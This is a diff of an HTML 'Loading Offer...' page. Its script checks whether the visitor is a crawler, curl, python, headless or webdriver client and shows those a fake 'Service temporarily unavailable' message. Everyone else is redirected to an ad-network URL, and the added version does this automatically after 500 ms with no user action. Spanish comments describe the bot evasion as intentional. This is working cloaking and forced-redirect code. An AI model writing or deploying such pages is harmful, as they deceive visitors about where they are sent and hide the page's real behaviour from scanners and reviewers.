@@ -1,44 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Continue</title>
-<style>
-body{margin:0;padding:0;background:#000;color:#fff;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;overflow-y:scroll}
-.container{padding:20px;max-width:400px;width:90%}
-h1{font-size:2rem;margin-bottom:2rem;line-height:1.3}
-img{max-width:100%;height:auto;border-radius:10px;margin-bottom:2rem;box-shadow:0 0 15px #e50914}
-</style>
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-H9VLD02NMS"></script>
-<script>
-window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date());gtag('config','G-H9VLD02NMS');
-</script>
-<script>
-(()=>{const ua=navigator.userAgent.toLowerCase(),isBot=/bot|crawl|spider|curl|wget|python|fetch|headless|phantom|httpclient|java|axios/.test(ua),noPlugins=!navigator.plugins.length,noLang=!navigator.languages||!navigator.languages.length,isWebDriver=navigator.webdriver,noScreen=screen.width===0||screen.height===0;
-if(isBot||noPlugins||noLang||isWebDriver||noScreen){document.body.innerHTML="<h1>Service temporarily unavailable</h1>";return;}
-let redirected=false;
-function redirectNow(){
-  if(redirected) return;
-  redirected=true;
-  setTimeout(()=>{if(typeof gtag==="function"){gtag('event','auto_redirect',{event_category:'Redirect',event_label:'Auto Redirect to Offer'})}
-  window.location.href="https://www.profitableratecpm.com/nke9j3hu?key=34305eacf5bbfa7a826da55202c44b02";
-  },300);
-}
-// Eventos para distintos dispositivos
-window.addEventListener("touchstart", redirectNow, { once: true });
-window.addEventListener("mousemove", redirectNow, { once: true });
-window.addEventListener("scroll", redirectNow, { once: true });
-})();
-</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Continue</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .container {
+      padding: 20px;
+      max-width: 400px;
+      width: 90%;
+    }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 2rem;
+      line-height: 1.3;
+    }
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 10px;
+      margin-bottom: 2rem;
+      box-shadow: 0 0 15px #e50914;
+    }
+  </style>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-H9VLD02NMS"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){ dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'G-H9VLD02NMS');
+  </script>
+  <script>
+    (function() {
+      const ua = navigator.userAgent.toLowerCase();
+      const isBot = /bot|crawl|spider|curl|wget|python|fetch|httpclient|java|axios|headless|phantom|scrapy/.test(ua);
+      const hasWebDriver = navigator.webdriver || false;
+      const noPlugins = !navigator.plugins || navigator.plugins.length === 0;
+      const noLanguages = !navigator.languages || navigator.languages.length === 0;
+      const screenInvalid = screen.width === 0 || screen.height === 0;
+      const isHeadless = navigator.userAgent.includes("HeadlessChrome") || window.outerWidth === 0;
+
+      // Detección avanzada de bot
+      if (isBot || hasWebDriver || noPlugins || noLanguages || screenInvalid || isHeadless) {
+        document.body.innerHTML = "<h1>Service temporarily unavailable</h1>";
+        return;
+      }
+
+      // Redirección garantizada
+      setTimeout(function() {
+        if (typeof gtag === "function") {
+          gtag('event', 'auto_redirect', {
+            event_category: 'Redirect',
+            event_label: 'Auto Redirect to Offer'
+          });
+        }
+        window.location.href = "https://www.profitableratecpm.com/nke9j3hu?key=34305eacf5bbfa7a826da55202c44b02";
+      }, 500); // Pequeño delay para analítica + evitar redirección instantánea a bots rápidos
+    })();
+  </script>
 </head>
 <body>
-<div class="container">
-<h1>Loading Offer...</h1>
-<img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" alt="Loading" />
-</div>
+  <div class="container">
+    <h1>Loading Offer...</h1>
+    <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" alt="Loading..." />
+  </div>
 </body>
 </html>
+
 
 
 
